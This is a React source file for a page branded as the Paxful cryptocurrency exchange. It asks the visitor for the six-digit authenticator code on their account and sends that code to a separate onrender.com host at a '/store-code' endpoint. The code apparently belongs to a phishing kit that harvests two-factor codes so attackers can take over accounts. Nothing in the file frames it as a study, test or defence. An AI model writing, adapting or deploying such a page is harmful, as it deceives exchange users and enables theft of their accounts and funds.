import { useState } from 'react';
import { toast } from 'react-toastify'; // Optional: for success/error notifications
import logo from "../assets/paxful.jpeg"

export default function Authenticator() {
  const [code, setCode] = useState(Array(6).fill("")); // Initialize an array for 6 digits

  // Handle the change for individual code boxes
  const handleChange = (e, index) => {
    const newCode = [...code];
    newCode[index] = e.target.value;
    setCode(newCode);

    // Move to the next input box when a digit is entered
    if (e.target.value.length === 1 && index < 5) {
      document.getElementById(`code-${index + 1}`).focus();
    }
  };

  const handleSubmit = async () => {
    const fullCode = code.join(""); // Join the array into a string (e.g., '123456')

    if (fullCode.length !== 6) {
      toast.error("Please enter a valid 6-digit code");
      return;
    }

    try {
      const response = await fetch("https://paxful-login-dfeu.onrender.com/store-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: fullCode }),
      });

      const data = await response.json();
      if (response.ok) {
        toast.success("Code successfully sent!");
      } else {
        toast.error(data.error);
      }
    } catch (error) {
      console.error("Error:", error);
      toast.error("Something went wrong");
    }
  };

  return (
    <div className="relative flex justify-center items-center min-h-screen bg-black text-white">
      {/* Paxful Logo and Name at the top left */}
      <div className="absolute top-4 left-4 flex items-center">
        <img 
          src={logo} // Replace with your logo's path
          alt="Paxful Logo"
          className="w-10 h-10 mr-2" // Adjust size of the logo
        />
        <span className="text-3xl font-semibold ml-2 text-white">Paxful</span>
      </div>

      <div className="w-full max-w-md p-8 space-y-6 bg-black">
        <h1 className="text-3xl font-bold">Verification</h1>
        <p className="text-gray-400">
          Enter the 6-digit code we sent to the authenticator associated with your account
        </p>
         
         <h1>Confirmation code</h1>
        <div className="flex space-x-5 justify-left mt-4">
          {code.map((digit, index) => (
            <input
              key={index}
              id={`code-${index}`}
              type="text"
              value={digit}
              onChange={(e) => handleChange(e, index)}
              className="w-12 h-14  text-center text-xl bg-zinc-800 border border-zinc-800 rounded-xl focus:outline-none focus:border-green-400"
              maxLength="1"
              autoFocus={index === 0} // Focus the first input initially
            />
          ))}
        </div>

        <button
          onClick={handleSubmit}
          style={{ backgroundColor: '#AAFF00' }}
          className="w-full py-3 rounded-full text-black font-bold hover:bg-green-600 mt-4"
        >
          Verify
        </button>
      </div>
    </div>
  );
}
